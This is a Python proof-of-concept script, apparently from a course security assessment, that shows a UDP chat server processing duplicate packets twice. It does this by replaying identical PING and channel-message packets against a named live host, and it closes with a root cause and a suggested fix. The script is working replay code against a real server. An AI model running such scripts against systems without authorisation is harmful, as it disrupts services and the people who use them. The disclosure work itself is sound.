"""
VULN-05: Duplicate packets are processed twice (no idempotency)
===============================================================
When two identical packets are sent in rapid succession the server
processes both and sends two separate responses. There is no deduplication
on (session, request_handle) pairs.

Impact demonstrated with a direct message: sending the same DM packet
twice delivers it twice to the recipient — double delivery of every
state-changing operation.

Other affected operations:
  - SET_USERNAME  → two rename notifications sent to channel members
  - CHANNEL_JOIN  → two join notifications sent to members
  - CHANNEL_MSG   → message delivered twice to all members

Run: uv run python vulnerabilities/poc_05_duplicate_processing.py
"""
import socket, msgpack, random, time

HOST, PORT = 'csc4026z.link', 51825

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)
    s.connect((HOST, PORT))
    handle = random.randrange(1, 2**32)
    s.send(msgpack.packb({'request_type': 1, 'request_handle': handle}))
    r = msgpack.unpackb(s.recv(4096), raw=True)
    return s, r[b'session'], r.get(b'username', b'').decode()

def req(s, msg):
    s.send(msgpack.packb(msg))
    try:
        return msgpack.unpackb(s.recv(4096), raw=True)
    except socket.timeout:
        return None

def recv_all(s, count=5, timeout=2.0):
    s.settimeout(timeout)
    msgs = []
    for _ in range(count):
        try:
            msgs.append(msgpack.unpackb(s.recv(4096), raw=True))
        except socket.timeout:
            break
    return msgs

def h():
    return random.randrange(1, 2**32)


def main():
    # --- Part 1: Show duplicate PING responses ---
    print('Part 1 — duplicate PING (same handle sent twice)\n')
    sock, session, _ = connect()
    handle = h()

    sock.send(msgpack.packb({'request_type': 3, 'session': session, 'request_handle': handle}))
    sock.send(msgpack.packb({'request_type': 3, 'session': session, 'request_handle': handle}))

    responses = recv_all(sock, count=3, timeout=2.0)
    print(f'  Sent 1 PING packet twice with handle={handle}')
    print(f'  Responses received: {len(responses)}')
    for i, r in enumerate(responses, 1):
        print(f'    [{i}] response_type={r.get(b"response_type")}, '
              f'response_handle={r.get(b"response_handle")}')
    assert len(responses) >= 2, 'Expected 2 responses'
    print(f'  Both responses have handle={responses[0].get(b"response_handle")} — same request, processed twice\n')
    sock.close()

    # --- Part 2: Duplicate channel message — recipient gets it twice ---
    print('Part 2 — duplicate channel message (double delivery)\n')
    sock_a, sess_a, user_a = connect()
    sock_b, sess_b, user_b = connect()
    channel = f'dup-test-{random.randint(1000, 9999)}'

    req(sock_a, {'request_type': 4, 'session': sess_a, 'request_handle': h(),
                 'channel': channel, 'description': 'test'})
    req(sock_b, {'request_type': 7, 'session': sess_b, 'request_handle': h(),
                 'channel': channel})
    time.sleep(0.3)

    # Send the same message packet twice
    msg_handle = h()
    packet = msgpack.packb({'request_type': 9, 'session': sess_a,
                            'request_handle': msg_handle, 'channel': channel,
                            'message': 'this message was sent once'})
    sock_a.send(packet)
    sock_a.send(packet)  # exact same bytes, same handle
    time.sleep(0.5)

    received = recv_all(sock_b, count=5, timeout=2.0)
    msg_deliveries = [r for r in received if r.get(b'message')]
    print(f'  Sender sent 1 unique message packet twice (handle={msg_handle})')
    print(f'  Recipient received {len(msg_deliveries)} message(s):')
    for i, m in enumerate(msg_deliveries, 1):
        print(f'    [{i}] "{m.get(b"message", b"").decode()}"')

    # Cleanup
    req(sock_a, {'request_type': 8, 'session': sess_a, 'request_handle': h(), 'channel': channel})
    sock_a.close()
    sock_b.close()

    print(f'\n{"="*60}')
    if len(msg_deliveries) >= 2:
        print(f'CONFIRMED: 1 send → {len(msg_deliveries)} deliveries.')
        print(f'Root cause: no deduplication on (session, request_handle).')
        print(f'Fix: cache last N (session, handle) pairs and return cached')
        print(f'response without re-processing on duplicate.')
    else:
        print(f'Received {len(msg_deliveries)} message(s) — check timing and retry.')


if __name__ == '__main__':
    main()
